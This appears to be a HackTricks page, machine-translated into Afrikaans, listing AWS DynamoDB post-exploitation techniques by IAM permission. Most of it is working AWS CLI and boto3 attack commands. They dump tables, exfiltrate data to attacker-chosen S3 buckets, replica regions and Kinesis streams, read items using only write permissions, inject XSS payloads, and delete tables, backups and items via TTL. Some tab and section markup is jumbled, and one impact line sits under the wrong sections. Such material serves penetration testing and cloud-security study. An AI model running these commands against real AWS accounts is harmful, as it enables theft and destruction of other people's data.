# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

Vir meer inligting sien:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

'n aanvaller met hierdie toestemmings sal in staat wees om **items uit tabelle volgens die primêre sleutel te kry** (jy kan nie net vra vir al die data van die tabel nie). Dit beteken dat jy die primêre sleutels moet ken (jy kan dit kry deur die tabel se metadata te kry met `describe-table`).
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Indirect privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:GetItem`

**Soortgelyk aan die vorige permissions** stel hierdie een 'n potensiële aanvaller in staat om waardes uit slegs 1 tabel te lees, mits die primêre sleutel van die inskrywing bekend is:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Met hierdie toestemming is dit ook moontlik om die **`transact-get-items`** metode soos volg te gebruik:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potensiële impak:** Indirect privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:Query`

**Soortgelyk aan die vorige toestemmings** laat hierdie een 'n potensiële aanvaller toe om waardes te lees van net 1 tabel gegee die primêre sleutel van die inskrywing wat teruggehaal moet word. Dit laat toe om 'n [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) te gebruik, maar die enigste vergelyking wat met die primêre sleutel (wat moet verskyn) toegelaat word, is "EQ", dus kan jy nie 'n vergelyking gebruik om die hele DB in 'n versoek te kry nie.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Indirect privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:Scan`

Jy kan hierdie permissie gebruik om **dump die hele tabel maklik**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potensiële impak:** Indirek privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:PartiQLSelect`

Jy kan hierdie toestemming gebruik om **die hele tabel maklik te dump**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Hierdie toestemming laat ook toe om `batch-execute-statement` uit te voer soos:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
maar jy moet die primêre sleutel met 'n waarde spesifiseer, so dit is nie so nuttig nie.

**Potensiële impak:** Indirect privesc deur gevoelige inligting in die tabel te lokaliseer

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Hierdie toestemming sal 'n aanvaller toelaat om die **hele tabel na 'n S3 bucket van sy keuse uit te voer**:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Let wel dat die tabel vir dit om te werk point-in-time-recovery geaktiveer moet hê; jy kan nagaan of die tabel dit het met:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
As dit nie aangeskakel is nie, sal jy dit moet **aanskakel** en daarvoor het jy die **`dynamodb:ExportTableToPointInTime`** toestemming nodig:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potensiële impak:** Indirect privesc deur sensitiewe inligting in die tabel te vind

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`


Met hierdie permissies kan 'n aanvaller **'n nuwe tabel uit 'n backup skep** (of selfs 'n backup skep om dit dan in 'n ander tabel te herstel). Dan, met die nodige permissies, sou hy in staat wees om **inligting** vanaf die backups na te gaan wat **nie meer in die produksie-tabel voorkom nie**.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potensiële impak:** Indirekte privesc deur sensitiewe inligting in die tabel-rugsteun te vind

### `dynamodb:PutItem`

Hierdie toestemming stel gebruikers in staat om 'n **nuwe item by die tabel te voeg of 'n bestaande item deur 'n nuwe item te vervang**. As 'n item met dieselfde primêre sleutel reeds bestaan, sal die **gehele item met die nuwe item vervang word**. As die primêre sleutel nie bestaan nie, sal 'n nuwe item met die gespesifiseerde primêre sleutel **geskep** word.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** Uitbuiting van verdere kwesbaarhede of bypasses deur die vermoë om data in 'n DynamoDB-tabel by te voeg of te wysig

### `dynamodb:UpdateItem`

Hierdie toestemming maak dit vir gebruikers moontlik om die **bestaande eienskappe van 'n item te wysig of nuwe eienskappe by 'n item te voeg**. Dit **vervang nie** die hele item nie; dit werk slegs die gespesifiseerde eienskappe by. As die primêre sleutel nie in die tabel bestaan nie, sal die operasie **'n nuwe item skep** met die gespesifiseerde primêre sleutel en die eienskappe instel wat in die update expression gespesifiseer is.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potensiële impak:** Uitbuiting van verdere vulnerabilities/bypasses deur die vermoë om data by te voeg/wysig in 'n DynamoDB tabel

### `dynamodb:DeleteTable`

'n aanvaller met hierdie toestemming kan **'n DynamoDB-tabel verwyder, wat dataverlies veroorsaak**
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potensiële impak**: Dataverlies en ontwrigting van dienste wat op die verwyderde tabel staatmaak.

### `dynamodb:DeleteBackup`

'n Aanvaller met hierdie toestemming kan **'n DynamoDB-rugsteun uitvee, wat moontlik dataverlies kan veroorsaak in die geval van 'n noodherstelscenario**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potensiële impak**: Dataverlies en onvermoë om van 'n rugsteun te herstel tydens 'n rampherstel-scenario.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Toets of dit eintlik werk

'n aanvaller met hierdie toestemmings kan **'n stream op 'n DynamoDB-tabel aktiveer, die tabel bywerk om veranderinge te begin stroom, en dan toegang tot die stream kry om veranderinge aan die tabel in reële tyd te monitor**. Dit stel die aanvaller in staat om dataveranderinge te monitor en te exfiltrate, wat moontlik kan lei tot data leakage.

1. Aktiveer 'n stream op 'n DynamoDB-tabel:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Beskryf die stroom om die ARN en ander besonderhede te bekom:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Kry die shard iterator deur die stream ARN te gebruik:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Gebruik die shard iterator om data van die stroom te benader en te exfiltrateer:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potensiële impak**: Real-time monitering en data leakage van die DynamoDB-tabel se veranderinge.

### Lees items via `dynamodb:UpdateItem` and `ReturnValues=ALL_OLD`

'n Aanvaller met slegs `dynamodb:UpdateItem` op 'n tabel kan items lees sonder enige van die gewone lees-magtigings (`GetItem`/`Query`/`Scan`) deur 'n onskadelike update uit te voer en `--return-values ALL_OLD` te versoek. DynamoDB sal die volledige pre-update beeld van die item in die `Attributes` veld van die response teruggee (dit verbruik nie RCUs nie).

- Minimum toestemmings: `dynamodb:UpdateItem` op die teiken-tabel/sleutel.
- Voorvereistes: Jy moet die item se primêre sleutel ken.

Voorbeeld (voeg 'n onskadelike attribuut by en exfiltrates die vorige item in die response):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
Die CLI-antwoord sal 'n `Attributes`-blok insluit wat die volledige vorige item (alle attributes) bevat, wat effektief 'n lees-primitive vanaf skryftoegang bied.

**Potential Impact:** Lees arbitrêre items van 'n tabel met slegs skryftoestemmings, wat sensitiewe data exfiltration moontlik maak wanneer primêre sleutels bekend is.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Stealth exfiltration deur 'n nuwe replica Region by 'n DynamoDB Global Table (weergawe 2019.11.21) te voeg. As 'n principal 'n regionale replica kan byvoeg, word die hele tabel gerepliseer na die attacker-chosen Region, vanwaar die attacker alle items kan lees.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (deur kliënt bestuurde KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

Permissies: `dynamodb:UpdateTable` (with `replica-updates`) or `dynamodb:CreateTableReplica` on the target table. If CMK is used in the replica, KMS permissions for that key may be required.

Potensiële impak: Volledige tabelreplikasie na ’n streek wat deur die aanvaller beheer word, wat tot geslepe data-ekfiltrasie lei.

### `dynamodb:TransactWriteItems` (read via failed condition + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

'n aanvaller met transaksionele skryfbevoegdhede kan die volle eienskappe van 'n bestaande item ekfiltreer deur 'n `Update` binne `TransactWriteItems` uit te voer wat opsetlik 'n `ConditionExpression` laat misluk terwyl `ReturnValuesOnConditionCheckFailure=ALL_OLD` gestel is. By mislukking sluit DynamoDB die vorige eienskappe in die transaksie-kansellasieredes in, wat skryf-alleen toegang effektief in lees-toegang tot geteikende sleutels omskakel.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

Permissies: `dynamodb:TransactWriteItems` on the target table (and the underlying item). Geen leespermissies is vereis nie.

Potensiële impak: Lees ewekansige items (per primêre sleutel) vanaf 'n tabel deur slegs transaksionele skryfprivileges te gebruik via die teruggegewe kanselleringsredes.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` op GSI

Om leesbeperkings te omseil deur 'n Global Secondary Index (GSI) met `ProjectionType=ALL` op 'n lae-entropie attribuut te skep, daardie attribuut op 'n konstante waarde oor items heen te stel, en dan die `Query` op die indeks te gebruik om volledige items te herstel. Dit werk selfs as `Query`/`Scan` op die basistabel geweier word, solank jy die index ARN kan query.

- Minimale permissies:
- `dynamodb:UpdateTable` on the target table (om die GSI met `ProjectionType=ALL` te skep).
- `dynamodb:UpdateItem` on the target table keys (om die geïndekseerde attribuut op elke item te stel).
- `dynamodb:Query` on the index resource ARN (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Stappe (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Potensiële impak:** Full table exfiltration by querying a newly created GSI that projects all attributes, even when base table read APIs are denied.


### `dynamodb:EnableKinesisStreamingDestination` (Deurlopende exfiltration via Kinesis Data Streams)

Misbruik van DynamoDB Kinesis streaming destinations om changes van 'n tabel deurlopend te exfiltrate na 'n attacker-controlled Kinesis Data Stream. Sodra dit geaktiveer is, word elke INSERT/MODIFY/REMOVE-event byna in real-time na die stream gestuur sonder dat read permissions op die tabel benodig word.

Minimum permissions (attacker):
- `dynamodb:EnableKinesisStreamingDestination` on the target table
- Optionally `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` om die status te monitor
- Read permissions on the attacker-owned Kinesis stream om rekords te verwerk: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

'n Aanvaller met die dynamodb:UpdateTimeToLive toestemming kan die tabel se TTL (time-to-live) konfigurasie verander — TTL aktiveer of deaktiveer. Wanneer TTL geaktiveer is, sal individuele items wat die gekonfigureerde TTL-attribuut bevat, outomaties verwyder word sodra hul vervaltyd bereik is. Die TTL-waarde is net nog ’n attribuut op elke item; items sonder daardie attribuut word nie deur TTL-gebaseerde verwydering beïnvloed nie.

As items nog nie die TTL-attribuut bevat nie, sal die aanvaller ook ’n toestemming nodig hê wat items opdateer (byvoorbeeld dynamodb:UpdateItem) om die TTL-attribuut by te voeg en massa-verwyderings te aktiveer.

Skakel eers TTL op die tabel in en spesifiseer die attribuutnaam wat vir verval gebruik word:
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
Werk dan die items by om die TTL-attribuut (epoch-sekondes) by te voeg sodat hulle verstryk en verwyder sal word:
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

’n aanvaller met dynamodb:RestoreTableFromAwsBackup of dynamodb:RestoreTableToPointInTime magte kan nuwe tabelle skep wat uit backups of uit point-in-time recovery (PITR) herstel is sonder om die oorspronklike tabel te oorskryf. Die herstelde tabel bevat ’n volledige beeld van die data op die gekose tydstip, sodat die aanvaller dit kan gebruik om historiese inligting te exfiltrate of om ’n volledige dump van die databasis se vorige toestand te verkry.

Herstel ’n DynamoDB-tabel vanaf ’n on-demand backup:
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
Herstel 'n DynamoDB-tabel na 'n punt in tyd (skep 'n nuwe tabel met die herstelde toestand):
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**Potensiële impak:** Deurlopende, byna in reële tyd exfiltration van tabelveranderinge na 'n deur die aanvaller beheerde Kinesis-stream sonder direkte leesoperasies op die tabel.

{{#include ../../../../banners/hacktricks-training.md}}
